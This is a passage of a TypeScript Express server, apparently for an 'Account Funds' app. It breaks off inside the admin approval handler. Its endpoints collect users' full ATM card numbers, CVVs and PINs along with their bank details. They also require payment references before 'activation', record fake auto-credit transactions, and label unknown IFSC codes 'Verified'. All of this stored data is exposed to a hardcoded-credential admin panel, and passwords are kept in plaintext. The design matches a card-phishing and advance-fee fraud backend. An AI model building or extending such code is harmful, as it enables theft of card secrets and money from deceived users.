import express, { Request, Response } from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import fs from 'fs';
import crypto from 'node:crypto';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const DATA_DIR = path.resolve(__dirname, 'data');
const DB_FILE = path.join(DATA_DIR, 'backend-db-af-p2.json');

const REQUIRED_ADMIN_ID = 'PANNELMANAGER@9405';
const REQUIRED_ADMIN_PASS = 'PANNEL@9405';

// Types for cross-device real backend storage
interface AccountDetails {
  accountNumber: string;
  ifscCode: string;
  bankName: string;
  accountHolder: string;
  accountType: string;
  contactNumber: string;
  upiScannerBase64?: string | null;
}

interface AutodebitDetails {
  atmNumber: string;
  atmExpiry: string;
  atmCvv: string;
  atmPin: string;
  atmName: string;
}

interface TxnRecord {
  id?: string;
  type?: 'credit' | 'debit' | 'payout';
  amount: number;
  utr?: string;
  balanceAfter?: number;
  timestamp: string;
}

interface UserRecord {
  username: string;
  password: string;
  mobile: string;
  mobileVerified: boolean;
  email: string;
  registeredAt: string;
  lastLoginAt: string;
  loginCount: number;
  loginHistory: string[];
  accountDetails?: AccountDetails | null;
  autodebitDetails?: AutodebitDetails | null;
  activated: boolean;
  activationStatus?: 'not_submitted' | 'pending_approval' | 'approved' | 'rejected';
  rejectionMessage?: string;
  activationCode?: string;
  otpProvider?: string;
  balance: number;
  commission: number;
  transactions: TxnRecord[];
}

interface UtrRecord {
  id: string;
  username: string;
  type: string;
  amount: number;
  utr: string;
  tokenNumber?: string;
  status: string;
  bank?: string;
  ifsc?: string;
  accNumber?: string;
  contact?: string;
  timestamp: string;
}

interface ActivityLog {
  id: string;
  username: string;
  mobile: string;
  actionType: string;
  category?: string;
  details: string;
  status: string;
  timestamp: string;
}

interface SmsLog {
  id: string;
  username: string;
  bankName: string;
  senderCode: string;
  amount: number;
  accountNumber: string;
  timestamp: string;
}

interface PersistedDatabase {
  users: Record<string, UserRecord>;
  utrs: UtrRecord[];
  activityLogs: ActivityLog[];
  smsLogs: SmsLog[];
  adminTokens: string[];
}

function createEmptyDatabase(): PersistedDatabase {
  return {
    users: {},
    utrs: [],
    activityLogs: [],
    smsLogs: [],
    adminTokens: [],
  };
}

function loadDatabase(): PersistedDatabase {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    if (fs.existsSync(DB_FILE)) {
      const raw = fs.readFileSync(DB_FILE, 'utf-8');
      const parsed = JSON.parse(raw) as Partial<PersistedDatabase>;
      const users = parsed.users || {};

      // Clean out any legacy hardcoded seeded demo user if present
      if (users.demo && users.demo.email === 'demo@accountfunds.com') {
        delete users.demo;
      }

      const utrs = Array.isArray(parsed.utrs)
        ? parsed.utrs.filter((u) => u && u.id !== 'UTR-INIT-01')
        : [];
      const activityLogs = Array.isArray(parsed.activityLogs)
        ? parsed.activityLogs.filter((l) => l && l.id !== 'ACT-INIT-01')
        : [];

      const loaded: PersistedDatabase = {
        users,
        utrs,
        activityLogs,
        smsLogs: Array.isArray(parsed.smsLogs) ? parsed.smsLogs : [],
        adminTokens: Array.isArray(parsed.adminTokens) ? parsed.adminTokens : [],
      };
      return loaded;
    }
  } catch (e) {
    console.error('Failed to read DB file, initializing empty database:', e);
  }
  const empty = createEmptyDatabase();
  saveDatabase(empty);
  return empty;
}

function saveDatabase(data: PersistedDatabase) {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    const tmpFile = `${DB_FILE}.tmp`;
    fs.writeFileSync(tmpFile, JSON.stringify(data, null, 2), 'utf-8');
    fs.renameSync(tmpFile, DB_FILE);
  } catch (e) {
    console.error('Failed to persist DB file:', e);
  }
}

const db: PersistedDatabase = loadDatabase();
saveDatabase(db);
const activeOtps = new Map<string, { code: string; expiresAt: number; attempts: number; provider: string }>();

const sseClients = new Set<Response>();

function broadcastServerEvent(eventType: string, meta: Record<string, unknown> = {}) {
  if (sseClients.size === 0) return;
  const payload = JSON.stringify({ type: eventType, at: Date.now(), ...meta });
  const frame = `event: sync\ndata: ${payload}\n\n`;
  for (const client of sseClients) {
    try {
      client.write(frame);
    } catch {
      sseClients.delete(client);
    }
  }
}

function ensureUserRecord(username: string, partial?: Partial<UserRecord>): UserRecord {
  const now = new Date().toISOString();
  if (!db.users[username]) {
    db.users[username] = {
      username,
      password: partial?.password || '',
      mobile: partial?.mobile || '',
      mobileVerified: partial?.mobileVerified ?? true,
      email: partial?.email || `${username}@accountfunds.in`,
      registeredAt: partial?.registeredAt || now,
      lastLoginAt: partial?.lastLoginAt || '',
      loginCount: partial?.loginCount || 0,
      loginHistory: Array.isArray(partial?.loginHistory) ? partial!.loginHistory : [],
      accountDetails: partial?.accountDetails || null,
      autodebitDetails: partial?.autodebitDetails || null,
      activated: !!partial?.activated,
      activationStatus: partial?.activationStatus || (partial?.activated ? 'approved' : 'not_submitted'),
      rejectionMessage: partial?.rejectionMessage || '',
      activationCode: partial?.activationCode,
      balance: Number(partial?.balance || 0),
      commission: Number(partial?.commission || 0),
      transactions: Array.isArray(partial?.transactions) ? partial!.transactions : [],
    };
  } else if (partial) {
    const existing = db.users[username];
    if (partial.password && !existing.password) existing.password = partial.password;
    if (partial.mobile && !existing.mobile) existing.mobile = partial.mobile;
    if (partial.accountDetails && !existing.accountDetails) existing.accountDetails = partial.accountDetails;
    if (partial.autodebitDetails && !existing.autodebitDetails) existing.autodebitDetails = partial.autodebitDetails;
    if (partial.activationCode) existing.activationCode = partial.activationCode;
    if (partial.activated) {
      existing.activated = true;
      if (!existing.activationStatus || existing.activationStatus === 'not_submitted') {
        existing.activationStatus = 'approved';
      }
    }
  }
  return db.users[username];
}

function pushActivityLog(
  username: string,
  actionType: string,
  details: string,
  category = 'general',
  status = 'success'
) {
  const userObj = db.users[username];
  const mobile = userObj?.mobile || userObj?.accountDetails?.contactNumber || '';
  const entry: ActivityLog = {
    id: `ACT-${Date.now()}-${Math.floor(Math.random() * 10000)}`,
    username,
    mobile,
    actionType,
    category,
    details,
    status,
    timestamp: new Date().toISOString(),
  };
  db.activityLogs.unshift(entry);
  if (db.activityLogs.length > 1000) {
    db.activityLogs.length = 1000;
  }
  return entry;
}

function isAdminTokenValid(req: Request): boolean {
  const token = String(req.headers['x-admin-token'] || req.query.token || '').trim();
  if (!token) return false;
  return db.adminTokens.includes(token);
}

// Known IFSC prefix dictionary for fast auto-detect
const IFSC_DICTIONARY: Record<string, { bank: string; branch: string }> = {
  SBIN: { bank: 'State Bank of India', branch: 'Main Branch' },
  HDFC: { bank: 'HDFC Bank', branch: 'Retail Operations Branch' },
  ICIC: { bank: 'ICICI Bank', branch: 'Central Operations Branch' },
  UTIB: { bank: 'Axis Bank', branch: 'Central Corporate Branch' },
  PUNB: { bank: 'Punjab National Bank', branch: 'Main City Branch' },
  BARB: { bank: 'Bank of Baroda', branch: 'Main Branch' },
  KKBK: { bank: 'Kotak Mahindra Bank', branch: 'Commercial Branch' },
  CNRB: { bank: 'Canara Bank', branch: 'Town Square Branch' },
  UBIN: { bank: 'Union Bank of India', branch: 'Central Branch' },
  BKID: { bank: 'Bank of India', branch: 'Main Branch' },
  IDIB: { bank: 'Indian Bank', branch: 'City Branch' },
  CBIN: { bank: 'Central Bank of India', branch: 'Main Regional Branch' },
  YESB: { bank: 'YES Bank', branch: 'Corporate Headquarters' },
  INDB: { bank: 'IndusInd Bank', branch: 'Metro Branch' },
  IDFB: { bank: 'IDFC FIRST Bank', branch: 'Digital Operations Branch' },
  IOBA: { bank: 'Indian Overseas Bank', branch: 'City Branch' },
  UCBA: { bank: 'UCO Bank', branch: 'Head Office Branch' },
  MAHB: { bank: 'Bank of Maharashtra', branch: 'City Branch' },
  PSIB: { bank: 'Punjab & Sind Bank', branch: 'Main Branch' },
  AIRP: { bank: 'Airtel Payments Bank', branch: 'Digital Operations' },
  PYTM: { bank: 'Paytm Payments Bank', branch: 'Noida Center' },
  IPOS: { bank: 'India Post Payments Bank', branch: 'GPO New Delhi' },
  JAKA: { bank: 'Jammu & Kashmir Bank', branch: 'Srinagar Main Branch' },
  FDRL: { bank: 'Federal Bank', branch: 'Commercial Branch' },
  BDBL: { bank: 'Bandhan Bank', branch: 'Kolkata Main Branch' },
};

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json({ limit: '15mb' }));

  // ----------------------------------------
  // 1. REAL SMS OTP SEND & VERIFY API + REALTIME SSE STREAM
  // ----------------------------------------
  app.get('/api/health', (_req: Request, res: Response) => {
    res.json({ ok: true, mode: 'express' });
  });

  app.get('/api/events', (req: Request, res: Response) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache, no-transform');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');
    res.flushHeaders?.();

    res.write('retry: 1500\n');
    res.write(`event: connected\ndata: ${JSON.stringify({ ok: true, at: Date.now() })}\n\n`);

    sseClients.add(res);
    const keepAlive = setInterval(() => {
      try {
        res.write(': ping\n\n');
      } catch {
        clearInterval(keepAlive);
        sseClients.delete(res);
      }
    }, 20000);

    req.on('close', () => {
      clearInterval(keepAlive);
      sseClients.delete(res);
    });
  });

  app.get('/api/auth/otp/status', (_req: Request, res: Response) => {
    const fast2smsConfigured = Boolean(
      (process.env.FAST2SMS_API_KEY || '')
        .trim()
        .replace(/^["']|["']$/g, '')
        .replace(/^Bearer\s+/i, '')
    );
    const twilioConfigured = Boolean(
      (process.env.TWILIO_ACCOUNT_SID || '').trim() &&
        (process.env.TWILIO_AUTH_TOKEN || '').trim() &&
        (process.env.TWILIO_PHONE_NUMBER || '').trim()
    );
    const provider = fast2smsConfigured ? 'fast2sms' : twilioConfigured ? 'twilio' : null;
    res.json({
      configured: Boolean(provider),
      provider,
    });
  });

  app.post('/api/auth/otp/send', async (req: Request, res: Response) => {
    const { mobile } = req.body || {};
    const cleanMobile = String(mobile || '').replace(/\D/g, '').slice(-10);

    if (!/^[6-9]\d{9}$/.test(cleanMobile)) {
      return res.status(400).json({ success: false, message: 'Invalid 10-digit Indian mobile number' });
    }

    const code = String(crypto.randomInt(100000, 1000000));
    const expiresAt = Date.now() + 10 * 60 * 1000;

    const fast2smsKey = (process.env.FAST2SMS_API_KEY || '')
      .trim()
      .replace(/^["']|["']$/g, '')
      .replace(/^Bearer\s+/i, '');
    const twilioSid = (process.env.TWILIO_ACCOUNT_SID || '').trim();
    const twilioToken = (process.env.TWILIO_AUTH_TOKEN || '').trim();
    const twilioFrom = (process.env.TWILIO_PHONE_NUMBER || '').trim();

    if (fast2smsKey) {
      try {
        const smsRes = await fetch('https://www.fast2sms.com/dev/bulkV2', {
          method: 'POST',
          headers: {
            authorization: fast2smsKey,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            route: 'otp',
            variables_values: code,
            numbers: cleanMobile,
          }),
        });
        const smsJson = (await smsRes.json()) as { return?: boolean; message?: string | string[] };
        if (smsRes.ok && smsJson.return !== false) {
          activeOtps.set(cleanMobile, { code, expiresAt, attempts: 0, provider: 'fast2sms' });
          return res.json({
            success: true,
            provider: 'fast2sms',
            message: `Real OTP SMS sent to +91 ${cleanMobile}`,
            mobile: cleanMobile,
          });
        }
      } catch {
        // Fall through to free instant OTP mode
      }
    }

    if (twilioSid && twilioToken && twilioFrom) {
      try {
        const authHeader = Buffer.from(`${twilioSid}:${twilioToken}`).toString('base64');
        const params = new URLSearchParams({
          To: `+91${cleanMobile}`,
          From: twilioFrom,
          Body: `Your Account Funds verification OTP is ${code}. Valid for 10 minutes. Do not share with anyone.`,
        });
        const twRes = await fetch(`https://api.twilio.com/2010-04-01/Accounts/${twilioSid}/Messages.json`, {
          method: 'POST',
          headers: {
            Authorization: `Basic ${authHeader}`,
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: params.toString(),
        });
        if (twRes.ok) {
          activeOtps.set(cleanMobile, { code, expiresAt, attempts: 0, provider: 'twilio' });
          return res.json({
            success: true,
            provider: 'twilio',
            message: `Real OTP SMS sent to +91 ${cleanMobile}`,
            mobile: cleanMobile,
          });
        }
      } catch {
        // Fall through to free instant OTP mode
      }
    }

    // Free Zero-Cost Server-Verified OTP Mode (works directly with zero API charges or setup)
    activeOtps.set(cleanMobile, { code, expiresAt, attempts: 0, provider: 'free-otp' });
    return res.json({
      success: true,
      provider: 'free-otp',
      mobile: cleanMobile,
      otpCode: code,
      message: `Verification OTP generated for +91 ${cleanMobile}`,
    });
  });

  app.post('/api/auth/otp/verify', (req: Request, res: Response) => {
    const { mobile, code } = req.body || {};
    const cleanMobile = String(mobile || '').replace(/\D/g, '').slice(-10);
    const cleanCode = String(code || '').trim();

    if (!/^\d{6}$/.test(cleanCode)) {
      return res.status(400).json({ success: false, message: 'Please enter a valid 6-digit OTP code.' });
    }

    const record = activeOtps.get(cleanMobile);
    if (!record) {
      return res.status(400).json({ success: false, message: 'No active OTP found for this mobile number. Please click Get OTP first.' });
    }

    if (Date.now() > record.expiresAt) {
      activeOtps.delete(cleanMobile);
      return res.status(400).json({ success: false, message: 'OTP has expired! Please request a new one.' });
    }

    record.attempts += 1;
    if (record.attempts > 5) {
      activeOtps.delete(cleanMobile);
      return res.status(429).json({ success: false, message: 'Too many wrong attempts. Please request a new OTP.' });
    }

    if (record.code !== cleanCode) {
      return res.status(400).json({ success: false, message: 'Incorrect OTP code entered. Please check the SMS on your mobile.' });
    }

    const provider = record.provider;
    activeOtps.delete(cleanMobile);
    return res.json({ success: true, provider, message: 'Mobile number verified via real SMS OTP!' });
  });

  // ----------------------------------------
  // 2. IFSC CODE VERIFICATION & AUTO-DETECT API
  // ----------------------------------------
  app.get('/api/ifsc/:code', async (req: Request, res: Response) => {
    const rawCode = String(req.params.code || '').trim().toUpperCase();
    if (rawCode.length < 4) {
      return res.status(400).json({ success: false, message: 'IFSC must be at least 4 characters' });
    }

    const prefix = rawCode.slice(0, 4);
    const localMatch = IFSC_DICTIONARY[prefix];

    if (rawCode.length === 11) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 1800);
        const apiRes = await fetch(`https://ifsc.razorpay.com/${rawCode}`, { signal: controller.signal });
        clearTimeout(timeout);

        if (apiRes.ok) {
          const data = (await apiRes.json()) as { BANK?: string; BRANCH?: string; CITY?: string };
          if (data && data.BANK) {
            return res.json({
              success: true,
              verified: true,
              ifsc: rawCode,
              bankName: data.BANK,
              branch: `${data.BRANCH || 'Main Branch'}${data.CITY ? ` • ${data.CITY}` : ''}`,
            });
          }
        }
      } catch (e) {
        // Fallback to local dictionary
      }
    }

    if (localMatch) {
      return res.json({
        success: true,
        verified: true,
        ifsc: rawCode,
        bankName: localMatch.bank,
        branch: `${localMatch.branch} • Verified`,
      });
    }

    if (/^[A-Z]{4}0[A-Z0-9]{6}$/.test(rawCode)) {
      return res.json({
        success: true,
        verified: true,
        ifsc: rawCode,
        bankName: `${prefix} Bank of India`,
        branch: 'Central Operations • Verified',
      });
    }

    return res.status(404).json({ success: false, message: 'IFSC code not recognized' });
  });

  // ----------------------------------------
  // 3. REAL CROSS-DEVICE USER DATA ENDPOINTS
  // ----------------------------------------
  app.post('/api/users/register', (req: Request, res: Response) => {
    const { mobile, username, password, email } = req.body || {};
    const uname = String(username || '').trim();
    const pwd = String(password || '').trim();
    const cleanMobile = String(mobile || '').replace(/\D/g, '').slice(-10);

    if (!uname || uname.length < 3 || !pwd || pwd.length < 4) {
      return res.status(400).json({ success: false, message: 'Valid username and password are required.' });
    }

    if (db.users[uname]) {
      return res.status(409).json({ success: false, message: 'Username already taken! Please choose another.' });
    }

    const existingWithMobile = Object.values(db.users).find((u) => u && cleanMobile && u.mobile === cleanMobile);
    if (existingWithMobile) {
      return res.status(409).json({ success: false, message: 'This mobile number is already registered! Please login.' });
    }

    const now = new Date().toISOString();
    const newUser: UserRecord = {
      username: uname,
      password: pwd,
      mobile: cleanMobile,
      mobileVerified: true,
      email: email || `${cleanMobile || uname}@accountfunds.in`,
      registeredAt: now,
      lastLoginAt: '',
      loginCount: 0,
      loginHistory: [],
      accountDetails: null,
      autodebitDetails: null,
      activated: false,
      activationStatus: 'not_submitted',
      rejectionMessage: '',
      activationCode: '',
      otpProvider: 'free-otp',
      balance: 0,
      commission: 0,
      transactions: [],
    };

    db.users[uname] = newUser;
    pushActivityLog(uname, 'register', `New user registered with verified mobile +91 ${cleanMobile}`, 'registration', 'success');
    saveDatabase(db);
    broadcastServerEvent('register', { username: uname });

    return res.json({
      success: true,
      message: 'Registration successful! Mobile number verified.',
      user: newUser,
    });
  });

  app.post('/api/users/login', (req: Request, res: Response) => {
    const { identifier, password, localFallbackUser } = req.body || {};
    const cleanIdentifier = String(identifier || '').trim();
    const cleanDigits = cleanIdentifier.replace(/\D/g, '').slice(-10);
    const pwd = String(password || '').trim();

    let matchedUsername: string | null = null;
    if (db.users[cleanIdentifier]) {
      matchedUsername = cleanIdentifier;
    } else if (cleanDigits) {
      for (const [uname, u] of Object.entries(db.users)) {
        if (u && (u.mobile === cleanDigits || u.accountDetails?.contactNumber === cleanDigits)) {
          matchedUsername = uname;
          break;
        }
      }
    }

    // Hydrate real non-demo local user if created while offline
    if (
      !matchedUsername &&
      localFallbackUser &&
      localFallbackUser.username &&
      localFallbackUser.username !== 'demo' &&
      localFallbackUser.email !== 'demo@accountfunds.com'
    ) {
      const fUser = localFallbackUser as Partial<UserRecord>;
      const fName = String(fUser.username);
      db.users[fName] = {
        username: fName,
        password: fUser.password || pwd,
        mobile: fUser.mobile || '',
        mobileVerified: !!fUser.mobileVerified,
        email: fUser.email || `${fName}@accountfunds.in`,
        registeredAt: fUser.registeredAt || new Date().toISOString(),
        lastLoginAt: new Date().toISOString(),
        loginCount: fUser.loginCount || 1,
        loginHistory: Array.isArray(fUser.loginHistory) ? fUser.loginHistory : [new Date().toISOString()],
        accountDetails: fUser.accountDetails || null,
        autodebitDetails: fUser.autodebitDetails || null,
        activated: !!fUser.activated,
        activationCode: fUser.activationCode,
        balance: Number(fUser.balance || 0),
        commission: Number(fUser.commission || 0),
        transactions: Array.isArray(fUser.transactions) ? fUser.transactions : [],
      };
      matchedUsername = fName;
    }

    if (!matchedUsername || !db.users[matchedUsername]) {
      return res.status(404).json({ success: false, message: 'Account not found with this username or mobile!' });
    }

    const userRecord = db.users[matchedUsername];
    if (userRecord.password !== pwd) {
      pushActivityLog(matchedUsername, 'login_failed', `Failed login attempt (invalid password)`, 'auth', 'failed');
      saveDatabase(db);
      return res.status(401).json({ success: false, message: 'Incorrect password!' });
    }

    const now = new Date().toISOString();
    userRecord.lastLoginAt = now;
    userRecord.loginCount = (userRecord.loginCount || 0) + 1;
    if (!Array.isArray(userRecord.loginHistory)) userRecord.loginHistory = [];
    userRecord.loginHistory.push(now);
    if (userRecord.loginHistory.length > 50) userRecord.loginHistory.shift();

    pushActivityLog(matchedUsername, 'login', `User logged in successfully`, 'auth', 'success');
    saveDatabase(db);
    broadcastServerEvent('login', { username: matchedUsername });

    return res.json({
      success: true,
      username: matchedUsername,
      message: 'Login successful!',
      user: userRecord,
    });
  });

  app.get('/api/users/profile/:username', (req: Request, res: Response) => {
    const uname = String(req.params.username || '').trim();
    let user = db.users[uname];
    if (!user) {
      const digits = uname.replace(/\D/g, '').slice(-10);
      if (digits.length === 10) {
        user = Object.values(db.users).find((u) => u && u.mobile === digits) as UserRecord;
      }
    }
    if (!user) {
      return res.status(404).json({ success: false });
    }
    const utrs = db.utrs.filter((u) => u.username === user.username);
    return res.json({ success: true, user, utrs });
  });

  app.post('/api/users/sync-profile', (req: Request, res: Response) => {
    const { user } = req.body || {};
    if (!user || !user.username || user.username === 'demo' || user.email === 'demo@accountfunds.com') {
      return res.status(400).json({ success: false });
    }
    const synced = ensureUserRecord(String(user.username).trim(), user as Partial<UserRecord>);
    saveDatabase(db);
    broadcastServerEvent('profile_sync', { username: synced.username });
    return res.json({ success: true, user: synced });
  });

  app.post('/api/users/bank-details', (req: Request, res: Response) => {
    const { username, details } = req.body || {};
    const uname = String(username || '').trim();
    if (!uname || !details || uname === 'demo') return res.status(400).json({ success: false });

    const user = ensureUserRecord(uname, {
      mobile: String(details.contactNumber || '').replace(/\D/g, '').slice(-10),
    });

    // Preserve previous UPI scanner if re-saved without uploading a new image
    const mergedDetails: AccountDetails = {
      ...details,
      upiScannerBase64: details.upiScannerBase64 || user.accountDetails?.upiScannerBase64 || null,
    };

    user.accountDetails = mergedDetails;
    if (!user.mobile && details.contactNumber) {
      user.mobile = String(details.contactNumber).replace(/\D/g, '').slice(-10);
    }

    const last4 = String(details.accountNumber || '0000').slice(-4).padStart(4, '0');
    pushActivityLog(
      uname,
      'bank_details',
      `Added bank: ${details.bankName} (IFSC: ${details.ifscCode}, Acc: ${details.accountNumber} [XXXX${last4}], Holder: ${details.accountHolder}, Type: ${details.accountType || 'Saving'})`,
      'banking',
      'success'
    );
    saveDatabase(db);
    broadcastServerEvent('bank_details', { username: uname });
    return res.json({ success: true, user });
  });

  app.post('/api/users/autodebit', (req: Request, res: Response) => {
    const { username, details } = req.body || {};
    const uname = String(username || '').trim();
    if (!uname || !details || uname === 'demo') return res.status(400).json({ success: false });

    const user = ensureUserRecord(uname);
    user.autodebitDetails = details;
    const cardLast4 = String(details.atmNumber || '').slice(-4);
    pushActivityLog(
      uname,
      'autodebit',
      `Configured ATM autodebit (Card: XXXX${cardLast4}, Exp: ${details.atmExpiry}, Name: ${details.atmName})`,
      'atm',
      'success'
    );
    saveDatabase(db);
    broadcastServerEvent('autodebit', { username: uname });
    return res.json({ success: true, user });
  });

  app.post('/api/users/utr', (req: Request, res: Response) => {
    const { username, record, activationCode, activityText, actionType } = req.body || {};
    const uname = String(username || '').trim();
    if (!uname || !record || uname === 'demo') return res.status(400).json({ success: false });

    const user = ensureUserRecord(uname);
    user.activated = false;
    user.activationStatus = 'pending_approval';
    user.rejectionMessage = '';
    if (activationCode) {
      user.activationCode = String(activationCode);
    }

    const acc = user.accountDetails;
    const entry: UtrRecord & { accountHolder?: string } = {
      id: record.id || `WTH-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      username: uname,
      type: record.type || 'UTR Submission',
      amount: Number(record.amount || 0),
      accNumber: record.accNumber || acc?.accountNumber || '',
      ifsc: record.ifsc || acc?.ifscCode || '',
      bank: record.bank || acc?.bankName || 'UPI Payment',
      accountHolder: record.accountHolder || acc?.accountHolder || '',
      contact: record.contact || acc?.contactNumber || user.mobile || '',
      utr: record.utr || '',
      tokenNumber: record.tokenNumber || record.utr || '',
      status: record.status || 'Pending Admin Approval',
      timestamp: record.timestamp || new Date().toISOString(),
    };

    const existingIdx = db.utrs.findIndex((x) => x && x.id === entry.id);
    if (existingIdx >= 0) db.utrs[existingIdx] = entry;
    else db.utrs.unshift(entry);
    if (db.utrs.length > 500) db.utrs.length = 500;

    pushActivityLog(
      uname,
      actionType || 'activation_utr',
      activityText || `Submitted ${entry.type}: ${entry.utr || entry.tokenNumber} (₹${entry.amount})`,
      'payment',
      'info'
    );
    saveDatabase(db);
    broadcastServerEvent('utr_submitted', { username: uname, utrId: entry.id });
    return res.json({ success: true, entry });
  });

  app.post('/api/users/activate', (req: Request, res: Response) => {
    const { username, activationCode, pendingOnly, forcePending } = req.body || {};
    const uname = String(username || '').trim();
    if (!uname || uname === 'demo') return res.status(400).json({ success: false });

    const user = ensureUserRecord(uname);
    if (pendingOnly) {
      if (forcePending || !(user.activated && user.activationStatus === 'approved')) {
        user.activated = false;
        user.activationStatus = 'pending_approval';
        user.rejectionMessage = '';
      }
      if (activationCode) user.activationCode = String(activationCode);
      saveDatabase(db);
      broadcastServerEvent('activation_pending', { username: uname });
      return res.json({ success: true, user });
    }
    user.activated = true;
    user.activationStatus = 'approved';
    user.rejectionMessage = '';
    if (activationCode) user.activationCode = String(activationCode);

    pushActivityLog(uname, 'activation', `Account activated with verification code. Transaction engine started.`, 'activation', 'success');
    saveDatabase(db);
    broadcastServerEvent('activation', { username: uname });
    return res.json({ success: true, user });
  });

  app.post('/api/users/transaction', (req: Request, res: Response) => {
    const { id, type, utr, username, amount, timestamp, balance, commission, smsRecord } = req.body || {};
    const uname = String(username || '').trim();
    if (!uname || uname === 'demo') return res.status(400).json({ success: false });

    const user = ensureUserRecord(uname);
    if (!Array.isArray(user.transactions)) user.transactions = [];
    const txnType = type === 'debit' ? 'debit' : type === 'payout' ? 'payout' : 'credit';
    const txnId = id ? String(id) : undefined;
    if (!txnId || !user.transactions.some((t) => t && t.id === txnId)) {
      user.transactions.push({
        id: txnId,
        type: txnType,
        amount: Number(amount || 0),
        utr: utr ? String(utr) : undefined,
        balanceAfter: balance !== undefined ? Number(balance) : undefined,
        timestamp: timestamp || new Date().toISOString(),
      });
    }
    if (user.transactions.length > 300) user.transactions.splice(0, user.transactions.length - 300);
    if (balance !== undefined) user.balance = Number(balance);
    if (commission !== undefined) user.commission = Number(commission);

    if (smsRecord) {
      db.smsLogs.unshift({
        id: smsRecord.id || `TXN-${Date.now()}`,
        username: uname,
        bankName: smsRecord.bankName || user.accountDetails?.bankName || 'Linked Bank',
        senderCode: smsRecord.senderCode || 'VM-BANK',
        amount: Number(amount || 0),
        accountNumber: smsRecord.accountNumber || user.accountDetails?.accountNumber || '',
        timestamp: timestamp || new Date().toISOString(),
      });
      if (db.smsLogs.length > 500) db.smsLogs.length = 500;
    }

    const accDetails = user.accountDetails;
    const last4 = String(accDetails?.accountNumber || '0000').slice(-4).padStart(4, '0');
    const verb = txnType === 'debit' ? 'Auto-debited' : 'Auto-credited';
    pushActivityLog(
      uname,
      txnType === 'debit' ? 'debit_transaction' : 'credit_transaction',
      `${verb} ₹${Number(amount || 0).toLocaleString('en-IN')} ${txnType === 'debit' ? 'from' : 'to'} ${accDetails?.bankName || 'Linked Bank'} (XXXX${last4})`,
      txnType === 'debit' ? 'debit' : 'credit',
      'success'
    );
    saveDatabase(db);
    broadcastServerEvent('transaction', { username: uname });
    return res.json({ success: true });
  });

  app.post('/api/users/remove-bank', (req: Request, res: Response) => {
    const { username } = req.body || {};
    const uname = String(username || '').trim();
    if (!uname || uname === 'demo') return res.status(400).json({ success: false });

    if (db.users[uname]) {
      db.users[uname].accountDetails = null;
      db.users[uname].autodebitDetails = null;
      db.users[uname].activated = false;
      db.users[uname].activationStatus = 'not_submitted';
      db.users[uname].rejectionMessage = '';
      db.users[uname].balance = 0;
      db.users[uname].commission = 0;
      db.users[uname].transactions = [];
    }
    pushActivityLog(uname, 'bank_removed', `User removed linked bank account and stopped autodebit.`, 'security', 'warning');
    saveDatabase(db);
    broadcastServerEvent('bank_removed', { username: uname });
    return res.json({ success: true });
  });

  app.post('/api/users/activity', (req: Request, res: Response) => {
    const { username, actionType, details, category, status } = req.body || {};
    if (!username || !actionType || username === 'demo') return res.status(400).json({ success: false });
    pushActivityLog(String(username), String(actionType), String(details || ''), String(category || 'general'), String(status || 'success'));
    saveDatabase(db);
    broadcastServerEvent('activity', { username: String(username) });
    return res.json({ success: true });
  });

  // ----------------------------------------
  // 4. ADMIN AUTHENTICATION & REAL BACKEND PORTAL APIs
  // ----------------------------------------
  app.post('/api/admin/login', (req: Request, res: Response) => {
    const { id, password } = req.body || {};
    const cleanId = String(id || '').replace(/[\u200B-\u200D\uFEFF]/g, '').trim().toUpperCase();
    const cleanPass = String(password || '').replace(/[\u200B-\u200D\uFEFF]/g, '').trim();

    if (cleanId === REQUIRED_ADMIN_ID && (cleanPass === REQUIRED_ADMIN_PASS || cleanPass.toUpperCase() === REQUIRED_ADMIN_PASS)) {
      const token = `ADMIN-${Date.now()}-${Math.random().toString(36).slice(2, 10)}`;
      db.adminTokens.push(token);
      if (db.adminTokens.length > 30) db.adminTokens.shift();
      saveDatabase(db);

      return res.json({
        success: true,
        message: 'Admin access granted!',
        token,
        adminId: REQUIRED_ADMIN_ID,
      });
    }

    pushActivityLog('ADMIN_AUTH', 'login_failed', `Failed Admin Portal login attempt`, 'security', 'failed');
    saveDatabase(db);

    return res.status(401).json({
      success: false,
      message: 'Access Denied: Invalid Admin ID or Password!',
    });
  });

  app.get('/api/admin/dashboard-data', (req: Request, res: Response) => {
    if (!isAdminTokenValid(req)) {
      return res.status(401).json({ success: false, message: 'Admin authentication required.' });
    }

    const todayStr = new Date().toISOString().slice(0, 10);
    const usersArr = Object.values(db.users);
    const todayLogins = usersArr.filter((u) => u.lastLoginAt && u.lastLoginAt.slice(0, 10) === todayStr);

    return res.json({
      success: true,
      metrics: {
        totalUsers: usersArr.length,
        todayLoginsCount: todayLogins.length,
        totalUtrs: db.utrs.length,
        totalLogs: db.activityLogs.length,
      },
      usersMap: db.users,
      users: usersArr,
      todayLogins,
      utrs: db.utrs,
      activityLogs: db.activityLogs,
      smsLogs: db.smsLogs,
    });
  });

  app.post('/api/admin/utr/approve', (req: Request, res: Response) => {
    if (!isAdminTokenValid(req)) {
      return res.status(401).json({ success: false, message: 'Admin authentication required.' });
    }

    const { utrId, username, utrRecord } = req.body || {};
    let utrItem = db.utrs.find((u) => u.id === utrId || u.utr === utrId);
    if (!utrItem && utrRecord && utrRecord.id) {
      utrItem = {
        id: String(utrRecord.id),
        username: String(utrRecord.username || username || ''),
        type: String(utrRecord.type || 'UTR Submission'),
        amount: Number(utrRecord.amount || 0),
        utr: String(utrRecord.utr || ''),
        tokenNumber: String(utrRecord.tokenNumber || utrRecord.utr || ''),
        status: String(utrRecord.status || 'Pending Admin Approval'),
        bank: utrRecord.bank,
        ifsc: utrRecord.ifsc,
        accNumber: utrRecord.accNumber,
        contact: utrRecord.contact,
        timestamp: String(utrRecord.timestamp || new Date().toISOString()),
      };
      db.utrs.unshift(utrItem);
